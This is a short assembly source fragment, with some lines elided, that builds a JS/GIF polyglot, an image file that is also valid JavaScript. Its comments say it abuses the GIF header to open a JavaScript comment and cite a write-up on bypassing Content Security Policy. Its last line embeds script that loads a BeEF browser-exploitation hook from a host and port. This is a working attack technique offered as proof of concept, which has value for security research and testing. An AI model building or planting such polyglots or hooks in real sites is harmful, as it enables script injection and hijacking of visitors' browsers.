; JS/GIF Polyglot - A Valid GIF and JS file
; a hand-made GIF containing valid JavaScript code
; abusing header to start a JavaScript comment
; http://opensecurity.in/bypassing-content-security-policy-with-a-jsgif-polyglot/
...
db 's.src = "http://127.0.0.1:5058/beefhook.js";'
